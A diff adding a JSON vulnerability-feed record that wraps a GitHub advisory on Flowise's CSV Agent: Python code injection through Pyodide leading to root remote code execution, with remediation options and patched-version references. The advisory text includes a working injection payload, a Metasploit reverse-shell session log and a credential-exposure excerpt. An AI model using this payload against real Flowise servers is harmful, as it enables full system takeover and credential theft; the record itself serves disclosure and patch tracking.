@@ -1,0 +1,63 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/244018018?v=4\", \"events_url\": \"https://api.github.com/users/lexi-core-ai/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/lexi-core-ai/followers\", \"following_url\": \"https://api.github.com/users/lexi-core-ai/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/lexi-core-ai/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/lexi-core-ai\", \"id\": 244018018, \"login\": \"lexi-core-ai\", \"node_id\": \"U_kgDODotrYg\", \"organizations_url\": \"https://api.github.com/users/lexi-core-ai/orgs\", \"received_events_url\": \"https://api.github.com/users/lexi-core-ai/received_events\", \"repos_url\": \"https://api.github.com/users/lexi-core-ai/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/lexi-core-ai/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/lexi-core-ai/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/lexi-core-ai\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-69255\", \"cvss\": {\"score\": null, \"vector_string\": null}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 0.0, \"vector_string\": null}, \"cvss_v4\": {\"score\": 9.2, \"vector_string\": \"CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N\"}}, \"cwes\": [{\"cwe_id\": \"CWE-94\", \"name\": \"Improper Control of Generation of Code ('Code Injection')\"}], \"description\": \"## UPDATE 2026-05-20: Full RCE as root VERIFIED\\n\\n**This is not theoretical — a Meterpreter reverse shell session as root has been established on Flowise 3.1.2.**\\n\\n### Verified Exploit Chain\\n\\n1. Python code injection via `base64_string = \\\"${base64String}\\\"` (CSVAgent.ts line 161)\\n2. Pyodide `js` bridge provides access to the host Node.js process\\n3. `process.mainModule.constructor._load('child_process')` loads child_process (bypasses ESM require restriction)\\n4. `.execSync('CMD')` executes arbitrary OS commands as **root** (PID 1 in container)\\n\\n### Working RCE Payload\\n\\n```\\n\\\";import js;e=js.globalThis.eval;e(\\\"process.mainModule.constructor._load('child_process').execSync('id')\\\");#\\n```\\n\\n**Constraint:** No commas allowed in payload — `csvFile.split(',')` splits on all commas.\\n\\n### Metasploit Session Proof\\n\\n```\\nmsf > use exploit/multi/http/flowise_csv_agent_rce\\nmsf > set PAYLOAD cmd/linux/http/x64/meterpreter/reverse_tcp\\nmsf > exploit\\n\\n[+] Authentication successful\\n[+] Created chatflow: b6716feb-63c8-4fd2-993f-cd43788704b4\\n[*] Sending stage (3090404 bytes) to 172.17.0.2\\n[*] Meterpreter session 1 opened (172.17.0.1:4444 -> 172.17.0.2:41422)\\n\\nmeterpreter > getuid\\nServer username: root\\n\\nmeterpreter > sysinfo\\nComputer     : cbce3fb352b7\\nOS           : Linux 6.8.0-111-generic\\nArchitecture : x64\\nMeterpreter  : x64/linux\\n\\nmeterpreter > shell\\n# id\\nuid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)\\n\\n# uname -a\\nLinux cbce3fb352b7 6.8.0-111-generic x86_64 Linux\\n```\\n\\n### Additional Verified Impact\\n\\n**Credential Theft:**\\n```\\nFLOWISE_PASSWORD=admin123\\nDATABASE_PATH=/root/.flowise\\nAPIKEY_PATH=...\\n```\\n\\n**Arbitrary File Read** via `process.binding('fs').readFileUtf8('/etc/hostname')` → `cbce3fb352b7`\\n\\n**Server DoS** — certain native binding calls (spawn_sync) crash the Node.js process entirely.\\n\\n### CVSS v3.1: 9.9 CRITICAL\\n\\n`AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`\\n\\n---\\n\\n## Original Report (below)\\n\\n## Vulnerable Code\\n\\n**File:** `packages/components/nodes/agents/CSVAgent/CSVAgent.ts`\\n\\n**Lines 133-138** — Unsanitized string extraction from data URI via `file.split(',').pop().pop()` — no validation on content.\\n\\n**Lines 155-171** — Direct interpolation into executable Python code:\\n`base64_string = \\\"${base64String}\\\"` is inserted into a Python string literal via JS template literal. If the string contains a closing double-quote followed by Python code, it breaks out of the string context.\\n\\n`validatePythonCodeForDataFrame()` denylist is only applied to LLM-generated code at line 198, NOT to this initial code block at line 171.\\n\\n## Remediation\\n\\n**Option 1 (Best):** Use `pyodide.globals.set('base64_string', base64String)` instead of string interpolation\\n\\n**Option 2:** Validate base64 before interpolation — reject if not matching `/^[A-Za-z0-9+/=]*$/`\\n\\n**Option 3:** Escape special characters (`\\\"`, `\\\\n`, `\\\\r`, `\\\\\\\\`) before interpolation\\n\\n## Related CVEs\\n- CVE-2026-41264 (CSV Agent regex bypass)\\n- CVE-2026-41265 (Airtable Agent sandbox bypass)\\n- CVE-2026-46442 (NodeVM sandbox escape)\\n\\n**Disclosure:** Identified with AI assistance (Claude Code). Analysis, verification, and Metasploit module by S9S Bounty-LAB / Kamal Sentassi.\", \"ghsa_id\": \"GHSA-vmv7-4m6c-3cg5\", \"github_reviewed_at\": \"2026-08-04T15:40:28Z\", \"html_url\": \"https://github.com/advisories/GHSA-vmv7-4m6c-3cg5\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-vmv7-4m6c-3cg5\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-69255\"}], \"nvd_published_at\": null, \"published_at\": \"2026-08-04T15:40:28Z\", \"references\": [\"https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-vmv7-4m6c-3cg5\", \"https://github.com/FlowiseAI/Flowise/pull/6499\", \"https://github.com/FlowiseAI/Flowise/commit/f4e2794f6a576b94578f2fdafbf49c2fb304626c\", \"https://github.com/FlowiseAI/Flowise/releases/tag/flowise%403.1.3\", \"https://github.com/advisories/GHSA-vmv7-4m6c-3cg5\"], \"repository_advisory_url\": \"https://api.github.com/repos/FlowiseAI/Flowise/security-advisories/GHSA-vmv7-4m6c-3cg5\", \"severity\": \"critical\", \"source_code_location\": \"https://github.com/FlowiseAI/Flowise\", \"summary\": \"Flowise: CSV Agent Remote Code Execution via Pyodide Code Injection — Root Shell Verified\", \"type\": \"reviewed\", \"updated_at\": \"2026-08-04T15:41:24Z\", \"url\": \"https://api.github.com/advisories/GHSA-vmv7-4m6c-3cg5\", \"vulnerabilities\": [{\"first_patched_version\": \"3.1.3\", \"package\": {\"ecosystem\": \"npm\", \"name\": \"flowise\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 3.1.2\"}, {\"first_patched_version\": \"3.1.3\", \"package\": {\"ecosystem\": \"npm\", \"name\": \"flowise-components\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 3.1.2\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-vmv7-4m6c-3cg5",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "flowise-components: <= 3.1.2",
+      "flowise: <= 3.1.2"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-41264",
+      "CVE-2026-41265",
+      "CVE-2026-46442",
+      "CVE-2026-69255"
+    ],
+    "cvss_score": 9.2,
+    "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "flowise",
+      "flowise-components"
+    ],
+    "remote": true,
+    "vendor_severity": "critical"
+  },
+  "first_seen_at": "2026-08-04T19:37:52.720860Z",
+  "provenance": {
+    "content_sha256": "8a64936a47cf17d783db3a7cd2cd245df3cd14104d54c480da6c287548764eb7",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-08-04T15:40:28Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-vmv7-4m6c-3cg5",
+  "status": "active",
+  "title": "Flowise: CSV Agent Remote Code Execution via Pyodide Code Injection — Root Shell Verified",
+  "updated_at": "2026-08-04T15:41:24Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-vmv7-4m6c-3cg5"
+}
